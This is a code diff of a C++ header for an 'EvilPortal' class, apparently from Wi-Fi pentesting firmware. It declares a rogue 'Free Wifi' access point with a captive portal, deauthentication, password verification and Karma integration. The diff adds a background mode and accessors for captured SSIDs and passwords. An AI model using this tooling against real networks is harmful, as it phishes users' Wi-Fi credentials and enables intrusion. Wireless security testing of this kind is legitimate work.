@@ -10,9 +10,7 @@ class EvilPortal {
     public:
         CaptiveRequestHandler(EvilPortal *portal) : _portal(portal) {}
         virtual ~CaptiveRequestHandler() { _portal = nullptr; }
-        bool canHandle(AsyncWebServerRequest *request) {
-            return true;
-        }; // request->addInterestingHeader("ANY");
+        bool canHandle(AsyncWebServerRequest *request) { return true; }
         void handleRequest(AsyncWebServerRequest *request);
 
     private:
@@ -20,26 +18,39 @@ class EvilPortal {
     };
 
 public:
-    /////////////////////////////////////////////////////////////////////////////////////
-    // Constructor
-    /////////////////////////////////////////////////////////////////////////////////////
-    EvilPortal(String tssid = "", uint8_t channel = 6, bool deauth = false, bool verifyPwd = false);
+    // Constructor with background mode support
+    EvilPortal(
+        String tssid = "", uint8_t channel = 6, bool deauth = false, bool verifyPwd = false,
+        bool autoMode = false, bool backgroundMode = false
+    );
     ~EvilPortal();
 
-    /////////////////////////////////////////////////////////////////////////////////////
-    // Operations
-    /////////////////////////////////////////////////////////////////////////////////////
     bool setup(void);
     void beginAP(void);
     void setupRoutes(void);
-    void loop(void);
+    void loop(void);            // Full UI loop (foreground mode)
+    void processRequests(void); // Lightweight heartbeat (background mode)
+
+    // Karma Integration Methods
+    bool hasCredentials();
+    String getCapturedSSID();
+    String getCapturedPassword();
+
+    // Background mode accessors
+    DNSServer &getDNSServer() { return dnsServer; }
+    AsyncWebServer &getWebServer() { return webServer; }
+    String getApName() { return apName; }
+    uint8_t getChannel() { return _channel; }
+    bool isBackgroundMode() { return _backgroundMode; }
 
 private:
     String apName = "Free Wifi";
     uint8_t _channel;
     bool _deauth;
     bool isDeauthHeld = false;
-    bool _verifyPwd; // From PR branch
+    bool _verifyPwd;
+    bool _autoMode;
+    bool _backgroundMode; // New flag for background operation
     AsyncWebServer webServer;
 
     DNSServer dnsServer;
@@ -57,6 +68,9 @@ private:
     int previousTotalCapturedCredentials = -1;
     String capturedCredentialsHtml = "";
     bool verifyPass = false;
+
+    // Track handler for cleanup
+    CaptiveRequestHandler *_captiveHandler = nullptr;
 
     void portalController(AsyncWebServerRequest *request);
     void credsController(AsyncWebServerRequest *request);
